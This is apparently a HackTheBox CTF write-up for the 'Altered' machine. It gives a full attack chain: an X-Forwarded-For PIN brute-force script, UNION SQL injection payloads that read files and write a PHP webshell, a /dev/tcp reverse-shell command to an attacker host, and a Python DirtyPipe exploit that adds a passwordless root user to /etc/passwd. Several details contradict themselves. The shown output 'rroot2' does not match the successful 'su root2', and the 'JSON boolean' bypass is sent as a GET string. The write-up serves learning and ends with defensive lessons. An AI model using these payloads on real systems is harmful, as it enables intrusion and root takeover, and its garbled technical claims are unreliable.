# HTB: Altered

![](https://img.shields.io/badge/OS-Linux-blue)
![](https://img.shields.io/badge/Difficulty-Hard-red)
![](https://img.shields.io/badge/Status-Retired-green)
![](https://img.shields.io/badge/CVE-2022--0847-critical)

**Tags:** `rate-limit-bypass` `x-forwarded-for` `brute-force` `php-type-juggling` `loose-comparison` `union-sqli` `load_file` `into-outfile` `webshell` `dirtypipe` `cve-2022-0847` `pam-bypass` `kernel-exploit`

---

## Overview

Altered is a Hard-rated Linux box that chains three distinct vulnerability classes into a full compromise. The entry point is a Laravel web app with a broken password reset flow — rate limiting is enforced purely client-side via `X-Forwarded-For`, making it trivial to brute-force a 4-digit PIN. Once authenticated, an API endpoint validates a request secret using PHP loose comparison (`==`), which can be bypassed by sending the JSON boolean `true` instead of a string — PHP treats `true == <any_non_empty_string>` as true. With integrity checking defeated, UNION-based SQL injection gives access to the filesystem via `LOAD_FILE()` and `INTO OUTFILE`, yielding RCE as `www-data`. Privilege escalation abuses DirtyPipe (CVE-2022-0847) on an unpatched kernel to overwrite protected files in-place, bypassing both a custom PAM Wordle challenge and a subtle 1-byte offset quirk in the exploit itself.

### Attack Path

```
[Recon]
  nmap → port 22 (SSH), port 80 (nginx / Laravel)
       ↓
[Phase 1 — Auth Bypass]
  /reset → POST username=admin
  → 4-digit PIN generated, rate limiter active
  → X-Forwarded-For rotation per request bypasses limiter
  → bash brute-force 0000–9999 → PIN: 3434
  → /changepw → password set → logged in as admin
       ↓
[Phase 2 — SQLi → RCE]
  /api/getprofile?id=1&secret=<hmac>
  → PHP == loose comparison: secret=true (JSON bool) bypasses HMAC check
  → id param: UNION SELECT (3 cols, col 3 reflected)
  → LOAD_FILE('/etc/nginx/sites-enabled/default') → webroot: /srv/altered/public/
  → INTO OUTFILE '/srv/altered/public/shell.php' → webshell
  → reverse shell as www-data
       ↓
[Phase 3 — PrivEsc]
  uname -r → 5.16.0 (< 5.16.11 → vulnerable to CVE-2022-0847)
  su blocked by pam_wordle.so → wordlist at /root/words (unreadable)
  DirtyPipe overwrites /etc/pam.d/su → PAM Wordle removed
  DirtyPipe overwrites /etc/passwd → root2::0:0:root:/root:/bin/bash
  su root2 → uid=0(root) → root.txt
```

---

## Enumeration

### Nmap

```
$ sudo nmap -sC -sV -p- --min-rate 5000 -oA nmap/altered 10.129.227.109

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx/1.18.0 (Ubuntu)
|_http-title: UHC March Finals
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports. The web server immediately redirects to `/login` — this is a Laravel application titled "UHC Player Dashboard".

### Web Application

Browsing to port 80 shows a login page. Navigating to `/reset` reveals a username-based password reset flow: submit a username, receive a 4-digit PIN, submit the PIN to `/api/resettoken`, then set a new password at `/changepw`.

---

## Phase 1 — Rate Limit Bypass → Admin Access

### How the Rate Limiter Works

Submitting `admin` to `/reset` generates a PIN and sends it via `POST /api/resettoken`. The app enforces a rate limit to prevent brute-force — but it keys exclusively off the `X-Forwarded-For` header rather than session or source IP.

```http
POST /api/resettoken HTTP/1.1
Host: 10.129.227.109
Content-Type: application/json
X-Forwarded-For: 10.0.1.1

{"name":"admin","token":"0000"}
```

By rotating the `X-Forwarded-For` value with each request, each attempt appears to originate from a different client. The rate limiter is completely ineffective.

### Why This Happens

Rate limiting at the application layer must be anchored to something the attacker cannot forge. `X-Forwarded-For` is a client-controlled header — any value can be sent. Correct implementation ties rate limits to the actual source IP at the infrastructure level (nginx/load balancer), or ignores `X-Forwarded-For` entirely.

### Brute-Force Script

```bash
#!/bin/bash
# brute_pin.sh — brute-force /api/resettoken via X-Forwarded-For rotation

TARGET="http://10.129.227.109"
USER="admin"
OCTET=0

for pin in $(seq -w 0 9999); do
    OCTET=$(( (OCTET + 1) % 255 ))
    XFF="10.0.${OCTET}.$(( RANDOM % 254 + 1 ))"

    RESP=$(curl -s -X POST "${TARGET}/api/resettoken" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: ${XFF}" \
        -d "{\"name\":\"${USER}\",\"token\":\"${pin}\"}")

    if ! echo "$RESP" | grep -qi "invalid"; then
        echo "[+] PIN found: $pin (XFF: $XFF)"
        echo "[*] Response: $RESP"
        break
    fi
done
```

```
[+] PIN found: 3434 (XFF: 10.0.47.183)
```

With PIN `3434` accepted, the password is set via `/changepw` and admin login is confirmed.

---

## Phase 2 — PHP Type Juggling + UNION SQLi → RCE

### Discovering the Vulnerable Endpoint

The authenticated dashboard's JavaScript reveals a `getBio()` function:

```javascript
function getBio() {
    fetch('/api/getprofile?id=' + userId + '&secret=' + userSecret)
        .then(r => r.json())
        .then(data => { ... });
}
```

The `secret` parameter is a server-generated HMAC the client sends back for integrity checking. Looking at how the server validates it:

```php
// Simplified server-side logic
if ($request->secret == hash_hmac('sha256', $id, $secret_key)) {
    // proceed with query
}
```

The comparison uses `==` (loose comparison) rather than `===` (strict) or `hash_equals()`. In PHP, `true == <any non-empty string>` evaluates to `true`.

### Why PHP Loose Comparison is Dangerous

PHP's `==` operator performs type coercion before comparing. When one side is a boolean `true`, PHP converts the other operand to boolean — any non-empty string becomes `true`. Sending the JSON boolean `true` (not the string `"true"`) instead of the HMAC value bypasses the check entirely without knowing the secret key.

```http
GET /api/getprofile?id=1&secret=true HTTP/1.1
Host: 10.129.227.109
Content-Type: application/json
```

Response confirms the integrity check is bypassed.

### SQL Injection

With the secret check defeated, the `id` parameter is injectable. Confirming 3 columns with column 3 reflected:

```
GET /api/getprofile?id=0 UNION SELECT 1,2,@@version-- -&secret=true

→ "8.0.28-0ubuntu0.20.04.3"
```

**Enumerating users and credentials:**

```
GET /api/getprofile?id=0 UNION SELECT 1,2,
    group_concat(name,0x3a,password SEPARATOR 0x0a) FROM users-- -&secret=true
```

**Leaking server config via `LOAD_FILE()`:**

```
GET /api/getprofile?id=0 UNION SELECT 1,2,
    load_file('/etc/nginx/sites-enabled/default')-- -&secret=true
```

Key finding in the nginx config:

```nginx
root /srv/altered/public;
```

### Writing a Webshell via `INTO OUTFILE`

MySQL's `FILE` privilege allows writing query results to disk. With the webroot known:

```
GET /api/getprofile?id=0 UNION SELECT 1,2,
    '<?php system($_GET["cmd"]); ?>'
    INTO OUTFILE '/srv/altered/public/shell.php'-- -&secret=true
```

Verifying execution:

```
$ curl 'http://10.129.227.109/shell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),117(mysql)
```

Upgrading to a reverse shell:

```
$ curl 'http://10.129.227.109/shell.php?cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261%27'
```

```
www-data@altered:/srv/altered/public$
```

The `.env` file yields database credentials: `DB_PASSWORD=P@ssw0rd1!`

---

## Phase 3 — DirtyPipe (CVE-2022-0847) → Root

### Kernel Version

```
www-data@altered:/tmp$ uname -r
5.16.0-051600-generic
```

Kernel `5.16.0` is below the patched version `5.16.11`. This is vulnerable to [CVE-2022-0847 (DirtyPipe)](https://dirtypipe.cm4all.com/).

### The Obstacle: pam_wordle.so

Attempting privilege escalation via `su` triggers an unexpected challenge:

```
www-data@altered:/tmp$ su admin
Guess the word (6 letters):
```

A custom PAM module (`pam_wordle.so`) intercepts every `su` call and requires solving a Wordle game before authentication proceeds. The wordlist is hardcoded at `/root/words` — unreadable as `www-data`. Traditional privesc paths through `su` are blocked.

### DirtyPipe: The Exploit Primitive

CVE-2022-0847 is a vulnerability in the Linux kernel's pipe subsystem. The `splice()` syscall can write data into a pipe that has the `PIPE_BUF_FLAG_CAN_MERGE` flag set. By abusing this, it's possible to overwrite arbitrary bytes in page-cached file contents — without write permissions to the file on disk.

**Plan:**
1. Overwrite `/etc/pam.d/su` with a permissive PAM config (removes `pam_wordle.so`)
2. Overwrite `/etc/passwd` line 0 to inject a passwordless UID-0 user

### The 1-Byte Offset Quirk

DirtyPipe's `splice()` always writes 1 byte from the original file content before the attacker-controlled payload begins. For `/etc/passwd`, the first byte of line 0 is `r` (from `root`). This means whatever we name our injected user, `r` will be prepended automatically.

**Workaround:** name the user `oot2` in the payload — the prepended `r` completes it to `root2`.

### Exploit

```python
#!/usr/bin/env python3
# dirtypipe_passwd.py — overwrite /etc/passwd via CVE-2022-0847
# Tested on kernel 5.16.0

import os, ctypes

libc = ctypes.CDLL('libc.so.6', use_errno=True)
target = '/etc/passwd'

with open(target, 'r') as f:
    content = f.read()

lines = content.split('\n')
# 'r' is prepended by splice → name 'oot2' becomes 'root2'
lines[0] = 'oot2::0:0:root:/root:/bin/bash'
new_content = '\n'.join(lines).encode()

orig_size = os.path.getsize(target)
new_content = (new_content + b'\x00' * orig_size)[:orig_size]

# Set up pipe with PIPE_BUF_FLAG_CAN_MERGE
r, w = os.pipe()
os.write(w, b'\x00' * 65536)
os.read(r, 65536)

# splice 1 byte from target file into pipe (sets the merge flag)
fd = os.open(target, os.O_RDONLY)
off = ctypes.c_int64(0)
libc.splice(fd, ctypes.byref(off), w, None, 1, 0)

# write payload — merges into page cache of target file
os.write(w, new_content)
os.close(fd)
print("[+] Done — check /etc/passwd line 1")
```

```
www-data@altered:/tmp$ python3 dirtypipe_passwd.py
[+] Done — check /etc/passwd line 1

www-data@altered:/tmp$ head -1 /etc/passwd
rroot2::0:0:root:/root:/bin/bash

www-data@altered:/tmp$ su root2
root@altered:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@altered:/tmp# cat /root/root.txt
468caee4d8f0305dbf0cedeb40f46ba2
```

---

## Flags

```
user.txt  →  af02deb21bf4d145eeff7f3712731a3f
root.txt  →  468caee4d8f0305dbf0cedeb40f46ba2
```

---

## What I Learned

**Rate Limiting on Client-Supplied Headers**
Any rate limit that relies solely on a header the client controls is bypassed trivially. `X-Forwarded-For` rotation is a well-known technique — defenders should enforce rate limits at the infrastructure layer, not the application layer, using the actual socket IP.

**PHP Type Juggling is Still Everywhere**
Loose comparison (`==`) for security-sensitive checks remains prevalent in PHP codebases, especially in older Laravel apps. The fix is a single character change — `===` or `hash_equals()` — but the bug is easy to miss in code review. Learning to spot `==` in authentication/integrity code is worth the investment.

**`INTO OUTFILE` as an RCE Vector**
MySQL's `FILE` privilege is often left enabled in development setups and forgotten in production. Combining UNION SQLi with `LOAD_FILE()`/`INTO OUTFILE` turns a read vulnerability into full RCE — the webroot path is the only additional piece needed.

**DirtyPipe Internals**
The 1-byte offset behaviour (splice always writes 1 byte from the original before the payload) is underdocumented and caused multiple failed attempts before the `oot2` → `root2` workaround clicked. Understanding pipe page-cache merging at the kernel level is directly applicable to future kernel exploit research.

**Defence-in-Depth vs. Novel Controls**
`pam_wordle.so` is a creative idea but ultimately an unsound security control — it sits in a single layer that DirtyPipe can overwrite. Novel controls that aren't part of a hardened stack don't add real security; they add complexity attackers can route around.

---

## References

- [CVE-2022-0847 (DirtyPipe) — Max Kellermann](https://dirtypipe.cm4all.com/)
- [PHP Type Juggling — OWASP](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
- [MySQL INTO OUTFILE — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [HackTheBox — Altered](https://www.hackthebox.com/machines/altered)
